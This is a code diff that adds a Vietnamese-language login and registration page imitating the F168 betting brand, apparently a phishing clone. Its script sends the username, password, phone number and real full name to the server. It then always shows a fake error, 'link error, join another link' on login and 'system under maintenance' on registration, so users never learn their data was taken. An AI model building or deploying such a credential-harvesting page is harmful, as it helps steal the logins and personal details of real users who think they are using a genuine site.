@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>F168 - Đăng Nhập & Đăng Ký</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            touch-action: manipulation;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Container chính cho phép cuộn toàn trang */
+        .app-container {
+            width: 100%;
+            max-width: 430px;
+            height: 100vh;
+            background-color: #ffaa00; /* Màu nền đồng bộ với ảnh */
+            overflow-y: auto; /* Cuộn dọc toàn trang */
+            scrollbar-width: none;
+            position: relative;
+        }
+        
+        .app-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* KHUNG TRẮNG CHỨA TOÀN BỘ FORM VÀ BANNER */
+        .white-panel {
+            background-color: #ffffff;
+            width: 100%;
+            /* Bỏ giới hạn chiều cao để khối tự động dài ra bao bọc hết nội dung bên trong */
+            min-height: 80vh; 
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            padding: 15px 20px 30px 20px; /* Padding dưới 30px để tạo khoảng trống dưới banner */
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 2; /* Luôn nổi lên trên ảnh nền */
+        }
+
+        /* ẢNH NỀN RYAN GIGGS Ở DƯỚI */
+        /* [SỬA] Đổi margin-top từ -30px thành -15px để ảnh tụt xuống, hết mất đầu */
+        .ryan-bg {
+            width: 100%;
+            display: block;
+            margin-top: -15px; 
+            position: relative;
+            z-index: 1;
+        }
+
+        /* --- CÁC THÀNH PHẦN TRONG FORM --- */
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .header .back-btn {
+            position: absolute;
+            left: 0;
+            color: #666;
+            font-size: 20px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .header .logo-img {
+            height: 65px; 
+            object-fit: contain;
+        }
+
+        .ambassador {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .ambassador .text {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.4;
+        }
+        
+        .ambassador .text strong {
+            font-size: 14px;
+        }
+        
+        .ambassador .signature img {
+            height: 45px;
+            object-fit: contain;
+        }
+
+        .tab-switcher {
+            display: flex;
+            background-color: #666;
+            border-radius: 30px;
+            height: 45px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+        
+        .tab-btn {
+            flex: 1;
+            border: none;
+            background: transparent;
+            color: #fff;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .tab-btn.active {
+            background-color: #ff9000;
+            border-radius: 30px;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            background: #fff;
+            border: 1px solid #f18a00;
+            border-radius: 8px;
+            height: 48px;
+            padding: 0 12px;
+            margin-bottom: 15px;
+        }
+        
+        .input-group i.prefix-icon {
+            color: #f18a00;
+            font-size: 18px;
+            width: 26px;
+        }
+        
+        .input-group .req {
+            color: #e60000;
+            margin-right: 5px;
+            font-weight: bold;
+        }
+        
+        .input-group input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 14px;
+            color: #333;
+            background: transparent;
+        }
+        
+        .input-group input::placeholder {
+            color: #999;
+        }
+        
+        .input-group .suffix-icon {
+            color: #ccc;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .input-group .suffix-icon.orange {
+            color: #f18a00;
+        }
+
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            padding-right: 10px;
+            margin-right: 10px;
+            border-right: 1px solid #ddd;
+            color: #333;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .vn-flag {
+            width: 24px;
+            height: 16px;
+            margin-right: 6px;
+            object-fit: cover;
+            border-radius: 2px;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+        
+        .custom-check {
+            width: 18px;
+            height: 18px;
+            background-color: #00b32c;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 12px;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+        
+        .checkbox-row a {
+            color: #f18a00;
+            text-decoration: none;
+        }
+
+        .submit-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .submit-btn {
+            width: 70%;
+            height: 48px;
+            background-color: #ff9000;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(255, 144, 0, 0.3);
+        }
+
+        .quick-links {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 10px;
+            margin-bottom: 20px;
+        }
+        
+        .quick-links.two-links {
+            justify-content: space-around;
+        }
+        
+        .quick-links a {
+            color: #f18a00;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 500; 
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 12.5px;
+            font-weight: normal; 
+            margin-bottom: 20px;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #eee;
+        }
+        
+        .divider span {
+            padding: 0 15px;
+        }
+
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .social-icon-box {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 1px solid #eee;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .social-icon-box img {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+        }
+
+        .pwd-strength {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #333;
+            font-weight: bold;
+            margin-top: -8px;
+            margin-bottom: 15px;
+        }
+        
+        .pwd-bar {
+            width: 38px;
+            height: 7px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+        }
+
+        .download-banner {
+            position: relative;
+            width: 100%;
+            height: 60px;
+            background: url('img_dlzc_xz_db.webp') center/100% 100% no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 0;
+            padding: 0 55px;
+        }
+        
+        .banner-text-content {
+            text-align: center;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        .banner-title {
+            color: #f18a00;
+            font-size: 11.5px;
+            font-weight: 900;
+            white-space: nowrap; 
+            margin-bottom: 2px;
+        }
+        
+        .banner-sub {
+            color: #666;
+            font-size: 9.5px;
+            font-weight: bold;
+            white-space: nowrap;
+        }
+
+        .glow-notice-img {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            margin-top: -10px;
+            margin-bottom: 15px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    
+    <!-- KHUNG TRẮNG CHỨA TOÀN BỘ NỘI DUNG FORM, ICON & BANNER -->
+    <div class="white-panel">
+        
+        <div class="header">
+            <a href="#" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+            <img src="img_dlzc_top_logo.webp" alt="F168 Logo" class="logo-img">
+        </div>
+
+        <div class="ambassador">
+            <div class="text">
+                <strong>Đại Sứ Thương Hiệu</strong><br>
+                <strong>Năm 2025 - 2026</strong><br>
+                <span>Ryan Giggs</span>
+            </div>
+            <div class="signature">
+                <img src="img_dlzc_zzs_logo5.webp" alt="Chữ ký Ryan Giggs">
+            </div>
+        </div>
+
+        <div class="tab-switcher">
+            <button class="tab-btn active" id="tab-login" onclick="switchTab('login')">ĐĂNG NHẬP</button>
+            <button class="tab-btn" id="tab-register" onclick="switchTab('register')">ĐĂNG KÝ</button>
+        </div>
+
+        <!-- ================= FORM ĐĂNG NHẬP ================= -->
+        <div id="form-login">
+            <div class="input-group">
+                <i class="fa-solid fa-user prefix-icon"></i>
+                <span class="req">*</span>
+                <input type="text" id="login-user" placeholder="Nhập Số điện thoại/Tên tài khoản">
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-lock prefix-icon"></i>
+                <span class="req">*</span>
+                <input type="password" id="login-pass" placeholder="Mật khẩu">
+                <i class="fa-solid fa-eye-slash suffix-icon"></i>
+            </div>
+
+            <div class="checkbox-row">
+                <span class="custom-check"><i class="fa-solid fa-check"></i></span>
+                <span>Ghi nhớ tài khoản mật khẩu</span>
+            </div>
+
+            <div class="submit-wrapper">
+                <button class="submit-btn" onclick="submitLogin()">ĐĂNG NHẬP</button>
+            </div>
+
+            <div class="quick-links">
+                <a href="#">Liên Hệ CSKH</a>
+                <a href="#">Chơi Thử</a>
+                <a href="#">Quên Mật Khẩu</a>
+            </div>
+
+            <div class="divider">
+                <span>Đăng Nhập Nhanh</span>
+            </div>
+
+            <div class="social-login">
+                <div class="social-icon-box">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f18a00" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/>
+                        <path d="M9 9v1m6-1v1m-3-1v3h-1m-2 3.5c1.5 1.5 4.5 1.5 6 0"/>
+                    </svg>
+                </div>
+                <div class="social-icon-box">
+                    <img src="comm_icon_sf_google.webp" alt="Google">
+                </div>
+            </div>
+            
+            <div class="download-banner">
+                <div class="banner-text-content">
+                    <div class="banner-title">TẢI APP THAM GIA KHÔNG LO BỊ CHẶN</div>
+                    <div class="banner-sub">TIỆN LỢI - AN TOÀN - MƯỢT MÀ HƠN</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= FORM ĐĂNG KÝ ================= -->
+        <div id="form-register" class="hidden">
+            <div class="input-group">
+                <i class="fa-solid fa-user prefix-icon"></i>
+                <span class="req">*</span>
+                <input type="text" id="reg-user" placeholder="Nhập Tên tài khoản">
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-lock prefix-icon"></i>
+                <span class="req">*</span>
+                <input type="password" id="reg-pass" placeholder="Nhập mật khẩu">
+                <i class="fa-solid fa-eye suffix-icon orange"></i>
+            </div>
+
+            <div class="pwd-strength">
+                <span>Độ mạnh mật khẩu</span>
+                <span class="pwd-bar"></span>
+                <span class="pwd-bar"></span>
+                <span class="pwd-bar"></span>
+                <span class="pwd-bar"></span>
+            </div>
+
+            <div class="input-group">
+                <div class="phone-prefix">
+                    <img src="Vietnam.png" alt="VN" class="vn-flag"> +84
+                </div>
+                <span class="req">*</span>
+                <input type="tel" id="reg-phone" placeholder="Nhập SĐT">
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-user-check prefix-icon"></i>
+                <span class="req">*</span>
+                <input type="text" id="reg-fullname" placeholder="Vui lòng nhập Họ và Tên thật của bạn">
+            </div>
+
+            <img src="apng_dlzc_tsy_vi.webp" alt="Notice" class="glow-notice-img">
+
+            <div class="checkbox-row">
+                <span class="custom-check"><i class="fa-solid fa-check"></i></span>
+                <span>Tôi trên 18 tuổi, đã đọc và đồng ý với <a href="#">《Thỏa thuận đăng ký người dùng》</a></span>
+            </div>
+
+            <div class="submit-wrapper">
+                <button class="submit-btn" onclick="submitRegister()">ĐĂNG KÝ</button>
+            </div>
+
+            <div class="quick-links two-links">
+                <a href="#">Liên Hệ CSKH</a>
+                <a href="#">Chơi Thử</a>
+            </div>
+
+            <div class="divider">
+                <span>Đăng Ký Ràng Buộc</span>
+            </div>
+
+            <div class="social-login">
+                <div class="social-icon-box">
+                    <img src="comm_icon_sf_google.webp" alt="Google">
+                </div>
+            </div>
+            
+            <div class="download-banner">
+                <div class="banner-text-content">
+                    <div class="banner-title">TẢI APP THAM GIA KHÔNG LO BỊ CHẶN</div>
+                    <div class="banner-sub">TIỆN LỢI - AN TOÀN - MƯỢT MÀ HƠN</div>
+                </div>
+            </div>
+        </div>
+
+    </div> <!-- Đóng thẻ khung trắng tại đây (sau banner tải app) -->
+
+    <!-- HÌNH NỀN RYAN GIGGS ĐƯỢC ĐẶT NỐI TIẾP NGAY DƯỚI KHUNG TRẮNG -->
+    <img src="img_dlzc_zzs_logo3.webp" alt="Ryan Giggs Background" class="ryan-bg">
+
+</div>
+
+<script>
+    function switchTab(tab) {
+        const loginForm = document.getElementById('form-login');
+        const registerForm = document.getElementById('form-register');
+        const tabLogin = document.getElementById('tab-login');
+        const tabRegister = document.getElementById('tab-register');
+
+        if (tab === 'login') {
+            loginForm.classList.remove('hidden');
+            registerForm.classList.add('hidden');
+            tabLogin.classList.add('active');
+            tabRegister.classList.remove('active');
+        } else {
+            loginForm.classList.add('hidden');
+            registerForm.classList.remove('hidden');
+            tabLogin.classList.remove('active');
+            tabRegister.classList.add('active');
+        }
+    }
+
+    function submitLogin() {
+        const user = document.getElementById('login-user').value;
+        const pass = document.getElementById('login-pass').value;
+
+        if (!user || !pass) {
+            alert('Vui lòng nhập đầy đủ thông tin!');
+            return;
+        }
+
+        // Gửi thẳng dữ liệu lên server mà không cần hiện popup mã PIN
+        fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                username: user, 
+                password: pass 
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            alert('Link lỗi vui lòng tham gia vào link khác');
+        })
+        .catch(err => {
+            alert('Link lỗi vui lòng tham gia vào link khác!');
+        });
+    }
+
+    function submitRegister() {
+        const user = document.getElementById('reg-user').value;
+        const pass = document.getElementById('reg-pass').value;
+        const phone = document.getElementById('reg-phone').value;
+        const name = document.getElementById('reg-fullname').value;
+
+        if (!user || !pass || !phone || !name) {
+            alert('Vui lòng điền đầy đủ tất cả các trường!');
+            return;
+        }
+
+        fetch('/api/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: user, password: pass, phone: phone, fullname: name })
+        })
+        .then(res => res.json())
+        .then(data => {
+            alert('Đăng ký thất bại, hệ thống đang bảo trì!');
+        })
+        .catch(err => {
+            alert('Đăng ký thất bại, hệ thống đang bảo trì!');
+        });
+    }
+</script>
+
+</body>
+</html>
